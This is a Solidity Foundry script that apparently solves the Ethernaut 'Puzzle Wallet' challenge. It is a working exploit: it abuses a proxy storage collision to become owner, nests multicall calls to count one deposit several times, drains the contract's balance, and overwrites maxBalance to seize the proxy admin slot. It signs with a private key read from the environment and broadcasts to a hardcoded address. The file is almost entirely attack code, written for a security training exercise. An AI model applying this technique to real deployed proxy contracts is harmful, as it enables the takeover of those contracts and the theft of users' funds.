// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { PuzzleWallet, PuzzleProxy } from "../src/PuzzleWallet.sol";

contract BadContract {

    function drain() external {
        while (true) {}
    }

}

contract PuzzleWalletSolver is Script {
	
	PuzzleProxy public proxy = PuzzleProxy(0xAF2260fa80b60Ef3c0AdCbfBA23a7C79fFA68E2f);
	PuzzleWallet public instance = PuzzleWallet(0xAF2260fa80b60Ef3c0AdCbfBA23a7C79fFA68E2f);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        console.log("=== LOGs ===");
        console.log(proxy.pendingAdmin());
        console.log(proxy.admin());
        console.log(instance.owner());
        console.logBytes32(bytes32(instance.maxBalance()));
        console.logBytes32(bytes32(address(instance).balance));


        proxy.proposeNewAdmin(me);
        instance.addToWhitelist(me);
        // address(instance).call(abi.encodeWithSignature("multicall(bytes[] calldata)", data));

        // BadContract badContract = new BadContract();

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](4);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        data[2] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        data[3] = abi.encodeWithSelector(instance.multicall.selector, depositData);
        // data[2] = abi.encodeWithSignature("deposit()");
        

        instance.multicall{value: 0.001 ether}(data);
        instance.execute(me, 0.002 ether, "");
        instance.setMaxBalance(uint256(uint160(me)));

        console.log("=== LOGs ===");
        console.log(proxy.pendingAdmin());
        console.log(proxy.admin());
        console.log(instance.owner());
        console.logBytes32(bytes32(instance.maxBalance()));
        console.logBytes32(bytes32(address(instance).balance));



        // instance.multicall(data);

		vm.stopBroadcast();


	}

}
